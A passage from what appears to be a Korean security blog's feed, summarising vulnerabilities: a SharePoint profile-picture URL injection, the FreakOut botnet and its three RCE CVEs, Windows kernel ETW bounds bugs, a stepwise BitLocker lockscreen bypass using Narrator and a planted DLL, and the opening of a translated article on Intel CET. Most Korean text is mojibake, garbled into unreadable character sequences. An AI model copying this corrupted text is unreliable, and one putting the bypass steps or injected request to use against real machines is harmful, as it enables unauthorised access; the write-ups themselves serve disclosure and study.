ìˆìŠµë‹ˆë‹¤. ëª¨ë“  ë³€ê²½ ì‚¬í•­ì´ ì €ì¥ë  ë•Œ POST requestë¡œ ìˆ˜í–‰ë˜ë©° ì•„ë˜ì™€ ê°™ì´ ë„ë©”ì¸ì— ì‚¬ìš©ìì— ëŒ€í•œ ë³€ê²½ ì‚¬í•­ì´ í‘œì‹œë©ë‹ˆë‹¤.</p><pre><code class="hljs apache"><span class="hljs-attribute">URL</span>: http://<span class="hljs-number">192.168.0.151</span>/_layouts/<span class="hljs-number">15</span>/EditProfile.aspx?UserSettingsProvider=<span class="hljs-number">234</span>bf<span class="hljs-number">0</span>ed-<span class="hljs-number">70</span>db-<span class="hljs-number">4158</span>-a<span class="hljs-number">332</span>-<span class="hljs-number">4</span>dfd<span class="hljs-number">683</span>b<span class="hljs-number">4148</span>&amp;ReturnUrl=http%<span class="hljs-number">3</span>a%<span class="hljs-number">2</span>f%<span class="hljs-number">2</span>f<span class="hljs-number">192.168.0.151</span>%<span class="hljs-number">2</span>fPerson.aspx%<span class="hljs-number">3</span>faccountname%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>C span%<span class="hljs-number">20</span>style=%<span class="hljs-number">22</span>background-color:%<span class="hljs-number">20</span>#fcbd<span class="hljs-number">00</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Epoint%<span class="hljs-number">3</span>C/span%<span class="hljs-number">3</span>E%<span class="hljs-number">255</span>C%<span class="hljs-number">3</span>Cspan%<span class="hljs-number">20</span>style=%<span class="hljs-number">22</span>background-color:%<span class="hljs-number">20</span>#fcbd<span class="hljs-number">00</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Eshareuser%<span class="hljs-number">3</span>C/span%<span class="hljs-number">3</span>E&amp;changephoto=<span class="hljs-number">1</span></code></pre><p>POST requestì—ëŠ” URL ì¸ì½”ë”© ëœ í˜•íƒœë¡œ ì—…ë¡œë“œëœ í”„ë¡œí•„ ì‚¬ì§„ì˜ ê²½ë¡œë¥¼ í¬í•¨í•œ íŒŒë¼ë¯¸í„° <code>ct100$PlaceHolderMain$ProfileEditorEditPricturURL</code>ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs angelscript">URL ì¸ì½”ë”© ëœ íŒŒë¼ë¯¸í„°ì™€ ê°’ctl00%<span class="hljs-number">24</span>PlaceHolderMain%<span class="hljs-number">24</span>ProfileEditorEditPictureURL=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F192<span class="hljs-number">.168</span><span class="hljs-number">.0</span><span class="hljs-number">.151</span>%<span class="hljs-number">3</span>A80%<span class="hljs-number">2</span>FUser%<span class="hljs-number">2520</span>Photos%<span class="hljs-number">2</span>FProfilbilder%<span class="hljs-number">2</span>Fpoint_shareuser_Mthumb.jpgìˆ˜ì •ëœ íŒŒë¼ë¯¸í„° ê°’ctl00$PlaceHolderMain$ProfileEditorEditPictureURL=http:<span class="hljs-comment">//123.itsec.de/random.png</span></code></pre><p>POST requestë¥¼ ìˆ˜ì •í•˜ì—¬ URL ê²½ë¡œë¥¼ ìˆ˜ì •í•˜ë©´ ë¡œì»¬ íŒŒì¼ì˜ ê²½ë¡œ ëŒ€ì‹  ìˆ˜ì •í•œ URL ê²½ë¡œê°€ HTML ì´ë¯¸ì§€ íƒœê·¸ì˜ <code>src</code> íŒŒë¼ë¯¸í„°ì— ì‚½ì…ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë©´ í•´ë‹¹ í”„ë¡œí•„ ì‚¬ì§„ì´ ì‚½ì…ëœ í˜ì´ì§€ë¥¼ ë°©ë¬¸í•˜ëŠ” ëª¨ë“  ì‚¬ìš©ìëŠ” ë°±ê·¸ë¼ìš´ë“œì—ì„œ í•´ë‹¹ ë§í¬ê°€ ì—´ë¦½ë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì„ í†µí•´ Denial of Service, Tracking, Internal path disclosure, Obfuscate attacks, Reputation damage ë“±ì˜ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>xss</tag>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>sharepoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] FreakOut : from three CVEs to IRC botnet</title>
    <link href="/2021/01/20/fabu1ous/2021-01-20/"/>
    <url>/2021/01/20/fabu1ous/2021-01-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.checkpoint.com/2021/freakout-leveraging-newest-vulnerabilities-for-creating-a-botnet/">Leveraging Newest Vulnerabilities for creating a Botnet</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>ì•„ë˜ ì„¸ í”„ë¡œê·¸ë¨ ì¤‘ í•˜ë‚˜ë¼ë„ ì‚¬ìš©í•˜ê³  ìˆëŠ” ì‹œìŠ¤í…œ</p><ul><li><p>TerraMaster TOS &lt; 4.2.06</p></li><li><p>Zend Framework &gt; 3.0.0</p></li><li><p>Liferay Portal &lt; 7.2.1 CE GA2</p></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Check PointëŠ” FreakOutì´ë¼ëŠ” ê³µê²©ê³¼ ê³µê²©ì— ì‚¬ìš©ë˜ëŠ” ì•…ì„± í”„ë¡œê·¸ë¨ <code>out.py</code>ì— ëŒ€í•œ ì •ë³´ë¥¼ ê³µê°œí–ˆìŠµë‹ˆë‹¤. FreakOutì€ ì•„ë˜ ì„¸ ê°€ì§€ CVEë¥¼ ì‚¬ìš©í•´ íƒ€ê²Ÿ ì‹œìŠ¤í…œì— <code> out.py</code>ë¼ëŠ” ì•…ì„± íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì„¤ì¹˜í•˜ê³  ì‹¤í–‰í•©ë‹ˆë‹¤.</p><ul><li><p>CVE-2020-28188</p><p>TerraMaster TOS(TerraMaster NAS ì„œë²„ ê´€ë¦¬ìš© ìš´ì˜ì²´ì œ)ì—ì„œ ë°œê²¬ëœ RCE ì·¨ì•½ì ì…ë‹ˆë‹¤. <code>/include/makecvs.php</code>ì˜ <code>event</code>íŒŒë¼ë¯¸í„°ì˜ ê²€ì¦ ë¯¸í¡ìœ¼ë¡œ OS commend injectionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p></li><li><p>CVE-2021-3007</p><p>Zend Framework(PHPë¡œ ë§Œë“¤ì–´ì§„ ì›¹ì•± í˜¹ì€ ì„œë¹„ìŠ¤ë¥¼ ìœ„í•œ package)ì—ì„œ ë°œê²¬ëœ RCE ì·¨ì•½ì ì…ë‹ˆë‹¤. <code>__destruct</code> ë©”ì†Œë“œì™€ ê´€ë ¨ëœ ê°ì²´ë¥¼ ì»¨íŠ¸ë¡¤í•  ìˆ˜ ìˆë‹¤ë©´ deserializtion ì·¨ì•½ì ì„ í†µí•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ê¹Œì§€ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. FreakOutì€ <code>callback</code>íŒŒë¼ë¯¸í„° ê°’ì„ í†µí•´ í•´ë‹¹ ì·¨ì•½ì ì„ ì•…ìš©í•©ë‹ˆë‹¤.</p></li><li><p>CVE-2020-7961</p><p>Liferay Portal(Javaë¡œ ì‘ì„±ëœ ì›¹ì•± í”Œë«í¼)ì—ì„œ ë°œê²¬ëœ RCE ì·¨ì•½ì ì…ë‹ˆë‹¤. JSONWS(Json web service)ì— ì¡´ì¬í•˜ëŠ” untrusted dataì— ëŒ€í•œ Java unmarshalling ì·¨ì•½ì ì„ ì•…ìš©í•´ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p></li></ul><p>íƒ€ê²Ÿ ì‹œìŠ¤í…œì— ì„¤ì¹˜ëœ <code>out.py</code>ëŠ” ì„¤ì¹˜ë  ë•Œë§ˆë‹¤ ë‹¤ë¥¸ ë°©ì‹ìœ¼ë¡œ ë‚œë…í™”ë©ë‹ˆë‹¤. <code>out.py</code>ì— ê°ì—¼ëœ ì‹œìŠ¤í…œì€ IRCë¥¼ í†µí•´ ì›ê²©ìœ¼ë¡œ ì¡°ì‘í•  ìˆ˜ ìˆëŠ” ë´‡ë„·ì— ì¶”ê°€ë˜ê³  ì•„ë˜ 2ê°€ì§€ í–‰ìœ„ì— ì‚¬ìš©ë©ë‹ˆë‹¤.</p><ol><li>ì¶”ê°€ ê°ì—¼ì„ ìœ„í•œ ê³µê²©ì„œë²„</li><li>ì½”ì¸ ë§ˆì´ë‹ ì„œë²„</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>botnet</tag>
      
      <tag>irc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Windows ì»¤ë„ í•˜ë‚˜ì˜ í•¨ìˆ˜ì—ì„œ ë°œê²¬ëœ 5ê°€ì§€ ì·¨ì•½ì </title>
    <link href="/2021/01/19/l0ch/2021-01-19/"/>
    <url>/2021/01/19/l0ch/2021-01-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.br0vvnn.io/pages/blogpost.aspx?id=4">A Series of Windows Kernel Bugs in a Single Function</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows kernel</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows ì»¤ë„ í•¨ìˆ˜ ì¤‘ ETW êµ¬ì„± ìš”ì†Œì˜ í•¨ìˆ˜ì¸ <code>EtwpNotifyGuid</code> ì— 5ê°œ ì´ìƒì˜ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í˜„ì¬ê¹Œì§€ ë°œê²¬ëœ ì·¨ì•½ì  ì¤‘ ìƒì„¸ ì •ë³´ê°€ ê³µê°œëœ ì·¨ì•½ì  ëª©ë¡ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ul><li>CVE-2020-1033</li><li><a href="https://hackyboiz.github.io/2020/10/26/idioth/cve-2020-1034/">CVE-2020-1034</a></li><li>CVE-2021-1662</li><li>CVE-2021-1682</li></ul><p>ì´ì¤‘ ìµœê·¼ì— ê³µê°œëœ ì·¨ì•½ì ì€ CVE-2021-1662ì™€ CVE-2021-1668ì…ë‹ˆë‹¤.</p><p>CVE-2021-1662ëŠ” ì˜ëª»ëœ ë²”ìœ„ ê²€ì¦ìœ¼ë¡œ ì¸í•œ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ìœ¼ë¡œ,  <code>EtwpNotifyGuid</code> í•¨ìˆ˜ì—ì„œ <code>input_buffer_length</code> ê°€ 0x90ì´ê³  <code>v10</code>ì´ 0x40ì´ë©´ ë²”ìœ„ ê²€ì‚¬ë¥¼ í†µê³¼í•´ <code>EtwpValidateTraceControlFilterDescriptors</code> í•¨ìˆ˜ì—ì„œ OOB ì•¡ì„¸ìŠ¤ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>CVE-2021-1682 ë˜í•œ ì˜ëª»ëœ ë²”ìœ„ ê²€ì¦ìœ¼ë¡œ ì¸í•œ í™ ë²„í¼ ì˜¤ë²„í”Œë¡œìš° ì·¨ì•½ì ì…ë‹ˆë‹¤. <code>EtwpNotifyGuid</code> í•¨ìˆ˜ëŠ” <code>EtwpAllocDataBlock</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ ì…ë ¥ ë²„í¼ë¥¼ ë³µì‚¬í•˜ê³  ì˜¤í”„ì…‹ 0x50ì— ì•¡ì„¸ìŠ¤ í•©ë‹ˆë‹¤. ë²„í¼ í¬ê¸°ë¥¼ ê²€ì‚¬í•  ë•Œ 0x48ë³´ë‹¤ í°ì§€ëŠ” í™•ì¸í•˜ì§€ë§Œ 0x50ë³´ë‹¤ ì‘ì€ ì§€ë¥¼ í™•ì¸í•˜ì§€ ì•Šì•„ 0x50ë³´ë‹¤ ì‘ì€ ë²„í¼ë¥¼ í• ë‹¹í•˜ë©´ ì˜¤í”„ì…‹ 0x50ì— ì•¡ì„¸ìŠ¤ í•  ë•Œ ë‹¤ìŒ í’€ì˜ í—¤ë”ë¥¼ ë®ì–´ì“¸ ìˆ˜ ìˆì–´ ì´ë¥¼ ì•…ìš©í•´ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>kernel</tag>
      
      <tag>information disclosure</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-1394 : Windows LockScreen Escalation of Privilege</title>
    <link href="/2021/01/18/idioth/2021-01-18/"/>
    <url>/2021/01/18/idioth/2021-01-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://secret.club/2021/01/15/bitlocker-bypass.html">BitLocker Lockscreen bypass</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows BitLocker Lockscreen ìš°íšŒë¥¼ í†µí•œ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì— ëŒ€í•œ ì„¸ë¶€ ì‚¬í•­ì´ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. BitLockerëŠ” Windowsì—ì„œ ì§€ì›í•˜ëŠ” ë””ìŠ¤í¬ ì•”í˜¸í™” ê¸°ëŠ¥ìœ¼ë¡œ ë³¼ë¥¨ ì „ì²´ì— ì•”í˜¸í™”ë¥¼ ì œê³µí•˜ì—¬ ìë£Œë¥¼ ë³´í˜¸í•˜ë„ë¡ ì„¤ê³„ëœ ê¸°ëŠ¥ì…ë‹ˆë‹¤. í•˜ì§€ë§Œ ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ê´€ë¦¬ì ê³„ì •ì„ ì¶”ê°€í•˜ì—¬ BitLockerë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ol><li>ë¡œê·¸ì¸ í™”ë©´ì—ì„œ â€œì•”í˜¸ë¥¼ ìŠì–´ë²„ë ¸ìŠµë‹ˆë‹¤.â€ë¥¼ ì„ íƒí•©ë‹ˆë‹¤.</li><li>ì ê¸ˆ ìš°íšŒ í›„ ì´ë™ì‹ ë“œë¼ì´ë¸Œì˜ ìë™ ì‹¤í–‰ì„ í™œì„±í™”í•©ë‹ˆë‹¤.</li><li>exe íŒŒì¼ê³¼ junction folderê°€ ìˆëŠ” USBë¥¼ ì‚½ì…í•©ë‹ˆë‹¤.</li><li>ì‹¤í–‰ íŒŒì¼ì´ ì‹¤í–‰ë˜ë©´ USBë¥¼ ì œê±°í•œ í›„ ë‹¤ì‹œ ì‚½ì…í•˜ê³  ë©”ì¸ í™”ë©´ìœ¼ë¡œ ëŒì•„ê°‘ë‹ˆë‹¤.</li><li>ë‚´ë ˆì´í„°ê°€ ì‹œì‘ë˜ë©´ ì„¤ì¹˜ëœ DLL í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.</li></ol><p>ìœ„ì˜ ì‘ì—…ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ LockScreenì„ ìš°íšŒí•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>â€œì•”í˜¸/PINì„ ìŠì–´ë²„ë ¸ìŠµë‹ˆë‹¤.â€ë¥¼ ì„ íƒí•©ë‹ˆë‹¤. </li><li>í™”ë©´ì„ ë³¼ ìˆ˜ ì—†ìœ¼ë¯€ë¡œ ë‚´ë ˆì´í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ íƒìƒ‰ì„ ì§„í–‰í•©ë‹ˆë‹¤.</li><li>shift í‚¤ë¥¼ 5ë²ˆ ì—°ì†ìœ¼ë¡œ ëˆ„ë¥´ë©´, ì„¤ì • ì°½ì„ ì—¬ëŠ” ë§í¬ê°€ ìˆëŠ” ì°½ì´ ëœ¹ë‹ˆë‹¤.</li><li>ë§í¬ë¥¼ í´ë¦­í•´ë„ ì‹œì‘ëœ ì„¤ì • ì°½ì€ ë³¼ ìˆ˜ ì—†ìœ¼ë¯€ë¡œ ë§í¬ë¥¼ 1ì´ˆì— 2ë²ˆ ì •ë„ ê³„ì† í´ë¦­í•©ë‹ˆë‹¤.</li><li>í™”ë©´ì— focus boxê°€ ë‚˜íƒ€ë‚˜ë©´ í•´ë‹¹ ì°½ì€ ì„¤ì • ì°½ì´ë¯€ë¡œ CapsLock + ì™¼ìª½ í™”ì‚´í‘œë¥¼ í†µí•´ í™ˆìœ¼ë¡œ ì´ë™í•©ë‹ˆë‹¤.</li><li>CapsLock + ë°©í–¥í‚¤ë¥¼ í†µí•´ ì¥ì¹˜ - ìë™ ì‹¤í–‰ - ì´ë™ì‹ ë“œë¼ì´ë¸Œ - í´ë”ë¥¼ ì—´ì–´ íŒŒì¼ ë³´ê¸°(íŒŒì¼ íƒìƒ‰ê¸°)ë¥¼ ì„ íƒí•©ë‹ˆë‹¤.</li></ol><p>ì´í›„ USB ì—°ê²° í›„ ë‚´ë ˆì´í„°ê°€ ì°½ì´ ë–´ë‹¤ê³  í–ˆì„ ë•Œ Exploit.exe íŒŒì¼ì„ ì‹¤í–‰í•˜ë©´ ì•”í˜¸ë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³  ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>USBê°€ ë§ˆìš´íŠ¸ ë  ë•Œ BitLockerëŠ” ì‹œìŠ¤í…œ ë³¼ë¥¨ ì •ë³´ì— <code>ClientRecoveryPasswordRotation</code>ì´ë¼ëŠ” ë””ë ‰í„°ë¦¬ë¥¼ ìƒì„±í•˜ê³  <code>Authenticated Users: (F), SYSTEM: (I) (OI) (CI) (F)</code> ê¶Œí•œì„ ë¶€ì—¬í•©ë‹ˆë‹¤. ë””ë ‰í„°ë¦¬ ìƒì„± ì‘ì—…ì„ ë¦¬ë‹¤ì´ë ‰íŠ¸ í•˜ê¸° ìœ„í•´ USBë¥¼ ì‚¬ìš©í•˜ì—¬ <code>\System Volume Information</code>ì„ <code>\RCP Control</code>ë¡œ í–¥í•˜ëŠ” ë§ˆìš´íŠ¸ í¬ì¸íŠ¸ë¡œ ë§Œë“­ë‹ˆë‹¤. ê·¸ í›„ <code>\RPC Control\ClientRecoveryPasswordRoation</code>ì— <code>\??\C:\Windows\system32\Narrator.exe.local</code>ì— ëŒ€í•œ ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ìƒì„±í•©ë‹ˆë‹¤. USBë¥¼ ë‹¤ì‹œ ì‚½ì…í•˜ë©´, <code>C:\Windows\System32\Narrator.exe.locl</code> í´ë”ëŠ” í•˜ìœ„ ë””ë ‰í„°ë¦¬ë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ê¶Œí•œìœ¼ë¡œ ìƒì„±ë©ë‹ˆë‹¤. ì´ í•˜ìœ„ ë””ë ‰í„°ë¦¬ì— DLL í˜ì´ë¡œë“œë¥¼ ë„£ì€ í›„ ë‚´ë ˆì´í„°ê°€ ì‹œì‘ë˜ë©´, DLL í˜ì´ë¡œë“œê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>lockscreen</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] R.I.P ROP: CET Internals in Windows 20H1</title>
    <link href="/2021/01/17/l0ch/cet-on-windows/"/>
    <url>/2021/01/17/l0ch/cet-on-windows/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš” L0chì…ë‹ˆë‹¤! ì§€ë‚œë²ˆ Windows Patch Diffingì— ì´ì–´ ì´ë²ˆì—” ë²ˆì—­ê¸€ë¡œ ëŒì•„ì™”ìŠµë‹ˆë‹¤.</p><p>ì˜¤ëŠ˜ ë²ˆì—­ê¸€ì˜ ì£¼ì œëŠ” ì¸í…”ì´ ë„ì…í•œ ìƒˆë¡œìš´ ë¯¸í‹°ê²Œì´ì…˜ì¸ CETì…ë‹ˆë‹¤. CETëŠ” ì´ì „ì— ìš°ë¦¬ ë§‰ë‚´ì¸ Fabu1ousì˜ <a href="https://hackyboiz.github.io/2020/12/06/fabu1ous/x64-stack-alignment/">x64 stack alignment</a> ê¸€ì˜ ë§ˆì§€ë§‰ì— ì ê¹ ì–¸ê¸‰ë˜ê¸°ë„ í–ˆì—ˆì£ ? ì¸í…”ì—ì„  ì´ë¯¸ ì°¨ì„¸ëŒ€ ëª¨ë°”ì¼ í”Œë«í¼ì¸ Tiger Lakeì— ì´ ê¸°ëŠ¥ì„ ë‚´ì¥í–ˆìœ¼ë‹ˆ ê³§ ìƒìš©í™”ê°€ ë¨¸ì§€ì•Šì•˜ë„¤ìš”.</p><p>ì²« ë²ˆì—­ê¸€ì´ë¼ ì˜¤ì—­ê³¼ ì˜¤íƒ€ê°€ ë‚œë¬´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.. ã… ã…  ë°œê²¬í•˜ì‹ ë‹¤ë©´ ê°€ì°¨ ì—†ì´ ì§€ì í•´ì£¼ì‹œë©´ ê°ì‚¬í•˜ê² ìŠµë‹ˆë‹¤.</p><blockquote><p> ì›ë¬¸ ê¸€ : <a href="https://windows-internals.com/cet-on-windows/">R.I.P ROP: CET Internals in Windows 20H1</a> </p></blockquote><h2 id="ë“¤ì–´ê°€ë©°"><a href="#ë“¤ì–´ê°€ë©°" class="headerlink" title="ë“¤ì–´ê°€ë©°"></a>ë“¤ì–´ê°€ë©°</h2><p>ìµœê·¼ Windows 10ì˜ 19H1(Version 1903) ë¦´ë¦¬ì¦ˆ ë²„ì „ì— ë§¤ìš° í¥ë¯¸ë¡œìš´ ì¼ì´ ë°œìƒí–ˆë‹¤. ì¸í…” <a href="https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf">CET(Control-flow Enforcement Technology)</a> êµ¬í˜„ì´ ìˆ˜ë…„ê°„ì˜ ë…¼ì˜ ëì— ì‹œì‘ëœ ê²ƒì´ë‹¤.</p><p>ì´ëŸ¬í•œ CET ì ìš©ì€ ëª¨ë“  ë²„ì „ì˜ Windows ë¦´ë¦¬ì¦ˆì— ì¶”ê°€ë˜ê³  ìˆìœ¼ë©°, ì‘ë…„(2020) ë¦´ë¦¬ìŠ¤ì¸ 20H1 (ë²„ì „ 2004)ì€ Intel Tiger Lake CPUì—ì„œ ë¦´ë¦¬ì¦ˆ ë  CETì˜ user mode shadow stack ê¸°ëŠ¥ì— ëŒ€í•œ ì§€ì›ì„ ì™„ë£Œí–ˆë‹¤.</p><p>ì¸í…” CETëŠ” ìµìŠ¤í”Œë¡œì‡ì—ì„œ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë˜ëŠ” ë‘ ê°€ì§€ ìœ í˜•ì˜ ì œì–´ íë¦„ ë¬´ê²°ì„± ìœ„ë°˜ì¸ forward-edge ìœ„ë°˜ (indirect CALL ë° JMP)ê³¼ backward-edge ìœ„ë°˜ (RET)ì„ í•´ê²°í•˜ëŠ” í•˜ë“œì›¨ì–´ ê¸°ë°˜ mitigationì´ë‹¤.</p><p>forward-edge êµ¬í˜„ì€ ìƒˆë¡­ì§€ ì•Šì§€ë§Œ (ê¸°ë³¸ì ìœ¼ë¡œ Microsoftì˜ <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">Control Flow Guard</a>ì™€ ìœ ì‚¬í•œ í˜•íƒœì˜ <a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">clang-cfi</a>ì´ê¸° ë•Œë¬¸ì´ë‹¤.) backward-edge êµ¬í˜„ì€ ISAì˜ ê·¼ë³¸ì ì¸ ë³€í™”ì— ì˜ì¡´í•œë‹¤. Shadow Stack ì€ CALL ëª…ë ¹ì–´ì— ì˜í•´ ìŠ¤íƒì— í‘¸ì‹œëœ ë°˜í™˜ ì£¼ì†Œë¥¼ ë³µì œí•˜ë©°, RET ëª…ë ¹ì–´ ì‹¤í–‰ ì‹œ ìŠ¤íƒ ë° ì„€ë„ìš° ìŠ¤íƒ ê°’ì„ ëª¨ë‘ í™•ì¸í•˜ê³  ë¶ˆì¼ì¹˜ ì‹œ INT #21 (ì œì–´ íë¦„ ë³´í˜¸ ì˜¤ë¥˜)ë¥¼ ìƒì„±í•œë‹¤.</p><p>ìš´ì˜ ì²´ì œ ë° ì»´íŒŒì¼ëŸ¬ëŠ” CALLê³¼ RET ì´ì™¸ì˜ ì œì–´ íë¦„ ì‹œí€€ìŠ¤(ì˜ˆ : ì˜ˆì™¸ í•´ì œ ë° <a href="https://en.cppreference.com/w/cpp/utility/program/longjmp">longjmp</a>)ë¥¼ ì§€ì›í•´ì•¼ í•˜ê¸° ë•Œë¬¸ì— ì‹œìŠ¤í…œ ìˆ˜ì¤€ì—ì„œ í•„ìš”í•œ ë™ì‘ê³¼ ì¼ì¹˜í•˜ë„ë¡ <code>Shadow Stack Pointer(SSP)</code> ë¥¼ ì¡°ì‘í•´ì•¼ í•˜ë©°, ì´ ì¡°ì‘ ìì²´ê°€ ì ì¬ì ì¸ ìš°íšŒê°€ ë˜ì§€ ì•Šë„ë¡ ê²€ì¦í•´ì•¼ í•œë‹¤. ì´ ê²Œì‹œë¬¼ì—ì„œëŠ” Windowsê°€ ì´ë¥¼ ë‹¬ì„±í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ì„¤ëª…í•œë‹¤.</p><p>Windowsê°€ ìŠ¤ë ˆë“œì— ëŒ€í•œ shadow stackì„ ì¡°ì‘í•˜ê³  ìœ íš¨ì„±ì„ ê²€ì‚¬í•˜ëŠ” ë°©ë²•ì— ëŒ€í•´ ìì„¸íˆ ì•Œì•„ë³´ê¸° ì „ì— ë¨¼ì € ë‘ ê°€ì§€ë¥¼ ì´í•´í•´ì•¼ í•œë‹¤. ì²« ë²ˆì§¸ëŠ” SSPì˜ ì‹¤ì œ ìœ„ì¹˜ ë° ê¶Œí•œì´ê³  ë‘ ë²ˆì§¸ëŠ” SSPìŠ¤ë ˆë“œ ê°„ ì½˜í…ìŠ¤íŠ¸ ì „í™˜ ì‹œ ì €ì¥/ë³µì›í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ë©”ì»¤ë‹ˆì¦˜ê³¼ í•„ìš”í•œ ê²½ìš° (ì˜ˆ : ì˜ˆì™¸ í•´ì œ ì¤‘)  SSP ìˆ˜ì •ì´ ìˆ˜í–‰ë˜ëŠ” ë°©ë²•ì´ë‹¤.</p><p>ì´ëŸ¬í•œ ë©”ì»¤ë‹ˆì¦˜ì„ ì„¤ëª…í•˜ë ¤ë©´ <a href="https://en.wikipedia.org/wiki/Advanced_Vector_Extensions">AVX(Advanced Vector eXtensions)</a> ëª…ë ¹ì„ ì§€ì›í•˜ê¸° ìœ„í•´ Intelì—ì„œ ë„ì…í•˜ê³  Windows 7ë¶€í„° Microsoftê°€ ì§€ì›í•œ Intel CPU ê¸°ëŠ¥ì„ ì•Œì•„ë´ì•¼ í•œë‹¤. ë˜í•œ ì´ ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ê¸° ìœ„í•´ ê¸°ì¡´ CONTEXTêµ¬ì¡°ë¥¼ ë¬¸ì„œí™”ë˜ì§€ ì•Šì€ CONTEXT_EXêµ¬ì¡°ë¡œ ì¬êµ¬ì„±í•˜ê³  ì´ë¥¼ ì²˜ë¦¬í•˜ê¸° ìœ„í•œ native APIë¥¼ ì¶”ê°€í•˜ëŠ” ê²ƒì— ëŒ€í•´ì„œë„ ì´ì•¼ê¸°í•´ì•¼ í•œë‹¤!</p><p>ë§ˆì§€ë§‰ìœ¼ë¡œ Windowsì˜ CET ê¸°ëŠ¥ì— ëŒ€í•œ ì¶”ê°€ì ì¸ ìš”êµ¬ì‚¬í•­ì„ ë‹¤ë£¨ê¸° ìœ„í•´ ì¼ë¶€ ì»´íŒŒì¼ëŸ¬ ë° PE íŒŒì¼ í¬ë§·ì˜ ë‚´ë¶€ì™€ ìƒˆë¡œìš´ í”„ë¡œì„¸ìŠ¤ ì •ë³´ í´ë˜ìŠ¤ë¥¼ ì‚´í´ë´ì•¼ í•œë‹¤. ì´ ê¸€ì˜ ëª©ì°¨ê°€ ì´ëŸ¬í•œ ê¸°ëŠ¥ì— ëŒ€í•œ ì „ì²´ì ì¸ ë‚´ìš©ì„ íƒìƒ‰í•˜ëŠ” ë° 